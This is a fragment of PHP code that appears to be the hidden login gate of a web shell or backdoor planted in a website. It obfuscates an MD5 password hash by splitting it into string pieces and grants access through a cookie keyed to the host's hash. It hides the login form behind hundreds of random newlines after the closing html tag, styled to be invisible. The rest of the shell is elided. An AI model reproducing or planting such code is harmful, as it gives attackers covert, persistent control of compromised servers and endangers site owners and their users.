...
$username = "5870e6"."831bfd3255"."46b"."a"."06169"."56e"."a"."3f"."8";

if(isset($_POST['username']) && md5( $_POST['username'] ) == $username){
    @$_COOKIE[md5($_SERVER['HTTP_HOST'])] = $username;
    @setcookie(md5($_SERVER['HTTP_HOST']), $username);
}

if (!isset($_COOKIE[md5($_SERVER['HTTP_HOST'])]) || ($_COOKIE[md5($_SERVER['HTTP_HOST'])] != $username)){
...
</body></html>'.@str_repeat("\n", rand(400,600)).'
<form method="post"><input style="margin:50 0 0 50;border:none;background-color:#FFF;cursor:default;" name="username" type="text"></form>
';
